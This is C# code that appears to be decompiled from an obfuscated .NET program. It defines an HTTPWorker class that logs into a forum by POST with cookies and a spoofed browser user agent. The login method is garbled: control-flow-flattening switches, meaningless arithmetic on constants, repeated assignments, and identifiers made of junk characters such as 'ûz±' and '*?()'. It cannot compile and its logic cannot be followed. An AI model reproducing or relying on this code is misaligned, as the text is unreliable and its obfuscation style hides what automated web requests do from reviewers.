namespace Shit
{
    using SerializationObjectManager;
    using Shit.My;
    using System;
    using System.Net;
    using TypeInfo;

    public class HTTPWorker
    {
        public static CookieContainer cookies;
        private byte[] data;

        public bool login(Shit.Forum forumInstance)
        {
            cookies = (CookieContainer) {]();
            try
            {
                bool flag;
                uint num2;
                int num4;
                int expressionStack_24A_0;
                int expressionStack_24A_1;
                uint num = 0x891c5e28;
                HttpWebRequest request = (HttpWebRequest) ûz±((string) *?());
                Z&çÄ(this, ref request);
            Label_0040:
                num4 = 0xbcaa6a5;
                int expressionStack_4C_0 = 0x1307dc96;
            Label_004C:;
                int num5 = expressionStack_4C_0;
                int num3 = 0x4d2;
                switch (((num2 = (uint) ((~((-num5 + (((-426985255 + 0x11f754e3) - (-2033683987 + -1287778676)) + ~(0x46cefd08 + 0x6220d3ef))) * -1637372033) ^ -520745311) + num4)) % 6))
                {
                    case 0:
                        goto Label_0040;

                    case 1:
                        flag = true;
                        num4 = (int) Shit.My.MyApplication.StringSplitOptions[0x4f];
                        expressionStack_4C_0 = ((int) (num2 << -1241701621)) ^ -22818573;
                        goto Label_004C;

                    case 3:
                        if (!t¶nt(forumInstance, cookies))
                        {
                            break;
                        }
                        num3 = 0x4d2;
                        expressionStack_24A_1 = -265659928;
                        goto Label_024A;

                    case 4:
                    {
                        this.data = =¿Óù(*CONSOLESCREENBUFFERINFO[0x42](), (string) *?());
                        request.ContentLength = this.data.Length;
                        object obj2 = m öX(request);
                        SerializationObjectManager.InternalNameSpaceEPM.LogSwitch(obj2, this.data, 0, this.data.Length);
                        TypeInfo.SoapNonPositiveInteger.ExporterEventKind(obj2);
                        TypeInfo.SoapNonPositiveInteger.CreateActContextParameters(obj2);
                        HttpWebResponse response2 = (HttpWebResponse) ctü(request);
                        num4 = (int) (num ^ InternalSerializerTypeE.SoapOption);
                        expressionStack_4C_0 = (((int) num2) ^ -1258515041) ^ -1106805856;
                        goto Label_004C;
                    }
                    case 5:
                        return flag;

                    default:
                        goto Label_032B;
                }
                expressionStack_24A_1 = 0x78fd92cf;
            Label_024A:
                num3 = 0x4d2;
                num3 = 0x4d2;
                num3 = 0x4d2;
                num3 = 0x4d2;
                num4 = -2124501154;
                expressionStack_4C_0 = expressionStack_24A_1 ^ ((int) (num2 * 0xb14f5cf6));
                goto Label_004C;
            }
            catch (Exception exception2)
            {
                SerializationObjectManager.Object.StackFrameHelper(exception2);
                Exception exception = exception2;
                ¯3U();
            }
        Label_032B:
            return false;
        }

        public void navTo()
        {
        }

        public void setConnectionParameters(ref HttpWebRequest request)
        {
            request.Method = "POST";
            *?("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.ContentType = "application/x-www-form-urlencoded";
            request.Proxy = null;
            request.CookieContainer = cookies;
            *?(1);
            *?(0);
            *?("Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8) Gecko/20051111 Firefox/1.5; FBI-version/0.07");
        }
    }
}

